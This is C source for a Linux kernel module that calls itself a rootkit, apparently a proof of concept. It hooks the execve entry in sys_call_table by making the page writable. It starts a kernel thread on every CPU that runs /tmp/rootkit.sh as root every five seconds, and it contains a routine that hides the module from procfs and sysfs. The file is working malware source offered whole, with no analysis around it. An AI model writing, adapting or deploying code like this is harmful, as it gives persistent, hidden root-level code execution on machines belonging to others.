#include <linux/module.h>
#include <linux/init.h>
#include <linux/sched.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/kallsyms.h>
#include <linux/unistd.h>    /* __NR_* system call indicies */
#include <asm/paravirt.h> /* write_cr0 */
#include <asm/pgtable.h> /* pte_mkwrite */

#define MAX_LEN 256

struct task_struct *my_kthread; 
unsigned long *syscall_table;
pte_t *pte;

//asmlinkage int (*real_write)(unsigned int, const char __user *, size_t);
asmlinkage int (*real_execve)(const char *filename, char *const argv[], char *const envp[]);


/*
asmlinkage int new_write (unsigned int x, const char __user *y, size_t size) {
    printk(KERN_EMERG "[+] write() hooked.");
    return real_write(x, y, size);
}
*/


asmlinkage int new_execve(const char *filename, char *const argv[], char *const envp[]) {
    pr_info("ROOTKIT hooked call to execve(%s, ...)\n", filename);
    return real_execve(filename, argv, envp);
}


void module_hide(void) {
	list_del(&THIS_MODULE->list);             //remove from procfs
	kobject_del(&THIS_MODULE->mkobj.kobj);    //remove from sysfs
	THIS_MODULE->sect_attrs = NULL;
	THIS_MODULE->notes_attrs = NULL;
}


static int exec_cmd(char *script){
	char cmd[] = "/bin/sh";
	char *argv[3];
	char *envp[3];

	argv[0] = "ps";
	argv[1] = script;
	argv[2] = NULL;
	
	envp[0] = "HOME=/";
	envp[1] = "PATH=/sbin:/bin:/usr/sbin:/usr/bin";
	envp[2] = NULL;

	if (call_usermodehelper(cmd, argv, envp, UMH_WAIT_PROC)) {
		//pr_info("ROOTKIT call_usermodehelper() failed\n");
		return 1;
	} else {
		pr_info("ROOTKIT executed sh %s\n", argv[1]);
		return 0;
	}
}

/*
size_t find_syscall(void){
	char buf[MAX_LEN];
	memset(0, buf, MAX_LEN);
    vfs_read(proc_version, buf, MAX_VERSION_LEN, &(proc_version->f_pos));
}
*/



static int threadfn(void *data){
	//int cpu = (int)data;
	do {
		exec_cmd("/tmp/rootkit.sh\0");
		msleep(5000);
		//pr_info("my_kthread slept [cpu=%d]\n", cpu);
	} while(!kthread_should_stop());

	pr_info("ROOTKIT kernel thread stopping\n");
	return 0;
}

static int __init my_init(void)
{
	int cpu;
	unsigned long *execve_addr;
	unsigned int level;

	syscall_table = NULL;
	execve_addr = NULL;
	cpu = 0;

    	pr_info("ROOTKIT module loaded at 0x%p\n", my_init);
	
	syscall_table = (void *)kallsyms_lookup_name("sys_call_table");
	pr_info("ROOTKIT syscall_table is at %p\n", syscall_table);

	pte = lookup_address((long unsigned int)syscall_table, &level);
	pr_info("ROOTKIT PTE address located %p\n", &pte);
	
	execve_addr = (void *)syscall_table[__NR_execve]; 
	pr_info("ROOTKIT execve is at %p\n", execve_addr);
	
	if (syscall_table != NULL) {
		
		//write_cr0 (read_cr0 () & (~ 0x10000));
        	pte->pte |= _PAGE_RW;

		real_execve = (void *)syscall_table[__NR_execve];
		syscall_table[__NR_execve] = &new_execve;
		
		//write_cr0 (read_cr0 () | 0x10000);
        	pte->pte &= ~_PAGE_RW;
		
		printk(KERN_EMERG "ROOTKIT sys_call_table hooked\n");
	} else {
		printk(KERN_EMERG "ROOTKIT sys_call_table is NULL\n");
	}


	//module_hide();
	
	for_each_online_cpu(cpu) {
		// create, bind, wake
		pr_info("ROOTKIT Starting kernal thread on cpu %d\n", cpu);
		my_kthread = kthread_create(threadfn, &cpu, "rootkit");
		kthread_bind(my_kthread, cpu);
		wake_up_process(my_kthread);	
	}
	
	return 0;
}


static void __exit my_exit(void)
{
	kthread_stop(my_kthread);

	if (syscall_table != NULL) {

		//write_cr0 (read_cr0 () & (~ 0x10000));
        	pte->pte |= _PAGE_RW;

		syscall_table[__NR_execve] = real_execve;

		write_cr0 (read_cr0 () | 0x10000);
        	pte->pte &= ~_PAGE_RW;

		printk(KERN_EMERG "ROOTKIT sys_call_table unhooked\n");
	} else {
		printk(KERN_EMERG "ROOTKIT syscall_table is NULL\n");
	}

	
	pr_info("ROOTKIT unloaded from 0x%p\n", my_exit);


}

module_init(my_init);
module_exit(my_exit);

MODULE_AUTHOR("Marcus Hodges");
MODULE_LICENSE("GPL v2");

